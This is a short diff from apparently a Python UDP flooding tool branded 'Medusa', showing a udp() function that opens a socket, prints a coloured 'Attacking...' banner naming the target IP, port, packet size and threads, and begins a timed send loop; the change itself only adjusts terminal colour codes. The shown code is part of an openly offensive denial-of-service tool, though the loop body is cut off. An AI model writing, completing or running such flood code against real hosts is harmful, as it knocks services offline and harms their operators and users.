@@ -34,7 +34,7 @@ timeout = time.time() + 1 * times
 def udp(ip, port, packet, times):
   timeout = time.time() + 1 * times
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} ip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
+  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
   while time.time() < timeout:
     try:
       try:
